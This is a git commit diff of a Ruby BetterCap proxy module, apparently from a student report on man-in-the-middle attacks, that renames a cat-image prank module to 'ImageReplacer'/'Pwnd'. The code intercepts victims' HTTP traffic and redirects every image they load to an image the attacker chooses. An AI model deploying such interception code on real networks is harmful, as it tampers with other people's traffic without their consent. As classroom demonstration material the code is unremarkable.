f5921d20a68b3df542dc527eb0751716a059350c
Federico Martinez <famfededeveloper@gmail.com>
2017-12-03 22:51:18 -0300

    Completa el informe para la seccion de MITM

--- imageReplacer.rb
+++ imageReplacer.rb
@@ -1,21 +1,21 @@
 # encoding: UTF-8
+# This proxy module will redirect all images to an image of our choice.
 
-# This proxy module will redirect all images to a cat image.
-class RedirectToCat < BetterCap::Proxy::HTTP::Module
+class ImageReplacer < BetterCap::Proxy::HTTP::Module
   meta(
-    'Name'        => 'RedirectToCat',
-    'Description' => 'This proxy module will redirect the target(s) images requests to a cat image.',
+    'Name'        => 'Pwnd',
+    'Description' => 'This proxy module will redirect the target(s) images requests to an image of our choice.',
     'Version'     => '1.0.0',
     'Author'      => "Federico Martinez",
     'License'     => 'GPL3'
   )
 
-  # Cat image URL
+  # Choosen image URL
   @@url = 'http://www.catster.com/wp-content/uploads/2017/08/A-fluffy-cat-looking-funny-surprised-or-concerned.jpg'
 
   def on_request( request, response )
     if response.content_type =~ /^image\/.*/ and !@@url.include?(request.host)
-      BetterCap::Logger.info "[#{'REDIRECT'.green}] Redirecting #{request.to_url} to cat ..."
+      BetterCap::Logger.info "[#{'REDIRECT'.green}] The requested image #{request.to_url} has been replaced! ..."
       response.redirect!(@@url)
     end
   end
